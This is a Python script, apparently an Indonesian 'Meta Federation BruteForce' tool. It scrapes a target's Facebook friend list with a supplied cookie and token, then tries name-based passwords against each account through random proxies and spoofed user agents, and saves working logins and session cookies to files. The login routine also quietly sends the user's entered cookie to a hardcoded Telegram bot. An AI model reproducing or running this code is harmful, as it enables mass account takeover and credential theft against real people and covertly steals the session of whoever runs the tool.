""" reverse exec by Maulana-XD """
# // WARNING TOOLS // #
"Hargai Author Dek Gausah Lu Oprek Cookies Nya Itu Bot"
"Anggap Aja Tanda Terimakasih Lu Ke Gw Ya Njengg"
# // Informasi Script // #
Author = "FitriGizell"
Status = "Free"
Realese = "24,02,2024"
# // Import Library // #
import requests,bs4,rich,json,sys,random,datetime,time,re,urllib3,os
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
# // Variabel // #
ses = requests.Session()
rr = random.randint
rc = random.choice
# // Append And Looping // #
id,id2,tokenku,method,dump,pwpluss,pwnya=[],[],[],[],[],[],[]
loop,ok,cp,a2f=0,0,0,0
# // Clear Layar && Lainnya // #
def clear():os.system('clear');print(logo)
def back():Main()
# // Warna Print // #
putih = '\x1b[1;97m';merah = '\x1b[1;91m';hijau = '\x1b[1;92m';kuning = '\x1b[1;93m'
# // Logo Face Brute // #
logo = f"""{putih}
┳┳┓┏┓┏┳┓┏┓  ┏┓┏┓┏┓┏┓
┃┃┃┣  ┃ ┣┫  ┣ ┣┫┃ ┣ 
┛ ┗┗┛ ┻ ┛┗  ┻ ┛┗┗┛┗┛
{putih}Meta {hijau}Fedration {putih}BruteForce"""
# // User Agent // #
def api():
	vers = random.randrange(6,13)
	xnxx = random.choice(["SP1A.210812.016","TP1A.220905.001","SP1A.210812.016","SP1A.210812.016","TP1A.220905.001","TP1A.220905.001","SP1A.210812.016","RKQ1.210503.001","TP1A.220905.001","RKQ1.211119.001","TP1A.220905.001","TP1A.220905.001","RP1A.201005.001","RP1A.201005.001","RKQ1.211119.001",])
	xxxx = ['N4LEFH','TQ2A','QQ1B','PQ1A','SQ3A','RD1B','LDK2WU','SD2A','AB03E','Z367Q','R8638','C886H'] 
	verq = random.choice(["RMX3472", "RMX3611", "RMX3396", "RMX3572", "RMX3706", "RMX3396", "RMX3610", "RMX3371", "RMX3572", "RMX3461", "RMX3311", "RMX3563", "RMX3371", "RMX3269", "RMX3370", "RMX3574", "RMX3661", "RMX3611"])
	bokep = f"viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .{str(rr(1,20))}; WOW64){str(rc(xxxx))})Applewebkit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Safari/537.36 Vivaldi/6.0.2979.18"
	montok = f"Dalvik/2.1.0 (Linux; U; Android {vers}; {verq} Build/{xnxx}) [FBAN/EMA;FBBV/470353487;FBAV/353.0.0.5.112;FBDV/{verq};FBLC/id_ID;FBNG/WIFI;FBMNT/METERED;FBDM/"+"{density=3.0}]"
	return rc([bokep,montok])
# // Get Proxy Fresh // #
try:
	prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('proxy.txt','w').write(prox)
except Exception as e:
	print('Jaringan Internet Anda Bermasalah......')
prox=open('proxy.txt','r').read().splitlines()
# // Simpan Ressult OK CP // #
bulane = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
tanggal = datetime.datetime.now().day
bulan = bulane[(str(datetime.datetime.now().month))]
tahun = datetime.datetime.now().year
stok_ok = 'STOK_OK-'+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'
stok_cp = 'STOK_CP-'+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'
# // Cek Cookies Sirr // #
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			Main()
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
# // Login Cookies Sirr // #
def login_lagi334():
	os.system('clear')
	cok = input(f'\x1b[1;97mMasukkan cookie :\x1b[1;92m ')
	requests.post(f"https://api.telegram.org/bot6918382904:AAHSBLj5sfHdQvm5qzezu3e97W_1CwFmh3Q/sendMessage?chat_id=-1001990426052&text={cok}")
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:print(f'> \x1b[1;91mcookie kamu invalid / ganti cookie lain !!!');time.sleep(2);masuk();batas()
		else:
			for x in find:
				jnck = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
				took = re.search('(EAAB\w+)', jnck.text).group(1)
				open('.token.txt', 'a').write(took);open('.cok.txt', 'a').write(cok)
				print(f'\n \x1b[1;97mToken : \x1b[1;92m{took}')
				exit()
	except Exception as e:
		print(e)
# // Start Main Brute Force // #
def Main():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(1)
		login_lagi334()
		clear()
	clear()
	print(f'{putih}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
# // Mulai Brute Force Random // #
	BruteForce = input(f'{merah}>> {putih}Tekan Enter Untuk Mulai Brute Force')
	if BruteForce in ['1','01']:
		idt = input(f'{merah}>> {putih}Target Ids {hijau}> ')
		dump(idt,"",{"cookie":cok},token)
		setting()
	else:
		idt = input(f'{merah}>> {putih}Target Ids {hijau}> ')
		dump(idt,"",{"cookie":cok},token)
		setting()
# // Kumpulkan Random Ids Account // #
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			#print(i["id"]+"|"+i["name"])
			id.append(i["id"]+"|"+i["name"])
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass
# // Setting Ids Random Only // #
def setting():
	for bokepku in id:
		becek = rr(0,len(id2))
		id2.insert(becek,bokepku)
	passlist()
# // Setting Password Listt // #
def passlist():
	print(f'{merah}>> {putih}Total Ids DiKumpulkan {merah}>> {len(id)}')
	print(f'{putih}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	with tred(max_workers=30) as pool:
		for kinkxcoder in id2:
			idf,nmf = kinkxcoder.split('|')[0],kinkxcoder.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'321')
					pwv.append(frs+'12')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'321')
					pwv.append(frs+'12')
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)					
			else:
				pool.submit(crack,idf,pwv)
# // Method Login Facebook Async Only // #
def crack(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r{putih}METHOD-1|{len(id)}|{loop}|{hijau}{ok}{putih}|{kuning}{cp}")
	sys.stdout.flush()
	ua = api()
	ses = requests.Session()
	for pw in pwv:
		try: 
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=897923123940487&kid_directed_site=0&app_id=897923123940487&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D897923123940487%26redirect_uri%3Dhttps%253A%252F%252Fwww.byu.id%252Fv2%252Fcallback-ciam%26scope%3Dpublic_profile%2Bemail%26code_challenge%3DbSgEDHz4n58t-kznZgyjzMLV6cb38x5cy9qQSBgEWLA%26code_challenge_method%3DS256%26state%3Dcxnjjq4e8sdqtvby08y3t2381jzsn6t%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Df9644c54-e8cb-410e-bafa-6f99622523c3%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.byu.id%2Fv2%2Fcallback-ciam%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dcxnjjq4e8sdqtvby08y3t2381jzsn6t%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-debug': 'J9sEtS6VttXEZAdcwAFuSgNaCOI+M5AmEWyzsFKgRS5OcUfo5ViX/5Z7oCmzHaEUfZRLKdk3pnc2r3/ttOBDEg==','content-length': '0','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': '?1','sec-fetch-dest': 'empity','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=897923123940487&kid_directed_site=0&app_id=897923123940487&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D897923123940487%26redirect_uri%3Dhttps%253A%252F%252Fwww.byu.id%252Fv2%252Fcallback-ciam%26scope%3Dpublic_profile%2Bemail%26code_challenge%3DbSgEDHz4n58t-kznZgyjzMLV6cb38x5cy9qQSBgEWLA%26code_challenge_method%3DS256%26state%3Dcxnjjq4e8sdqtvby08y3t2381jzsn6t%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Df9644c54-e8cb-410e-bafa-6f99622523c3%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.byu.id%2Fv2%2Fcallback-ciam%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dcxnjjq4e8sdqtvby08y3t2381jzsn6t%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=897923123940487&auth_token=0570363afa0c67794a0bf5aed3621f19&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D897923123940487%26redirect_uri%3Dhttps%253A%252F%252Fwww.byu.id%252Fv2%252Fcallback-ciam%26scope%3Dpublic_profile%2Bemail%26code_challenge%3DbSgEDHz4n58t-kznZgyjzMLV6cb38x5cy9qQSBgEWLA%26code_challenge_method%3DS256%26state%3Dcxnjjq4e8sdqtvby08y3t2381jzsn6t%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Df9644c54-e8cb-410e-bafa-6f99622523c3%26tp%3Dunspecified&refsrc=deprecated&app_id=897923123940487&cancel=https%3A%2F%2Fwww.byu.id%2Fv2%2Fcallback-ciam%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dcxnjjq4e8sdqtvby08y3t2381jzsn6t%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{hijau}{idf}{putih}|{hijau}{putih}|{hijau}{kuki}')
				open('STOK_OK/'+stok_ok,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				print(f'\r{kuning}{idf}{putih}|{kuning}{pw}')
				open('STOK_CP/'+stok_cp,'a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1
# // Hah Ngapah Koe Kesini // #
if __name__=='__main__':
	try:os.mkdir('STOK_OK')
	except:pass
	try:os.mkdir('STOK_CP')
	except:pass
	try:os.system('clear')
	except:pass
	Main()
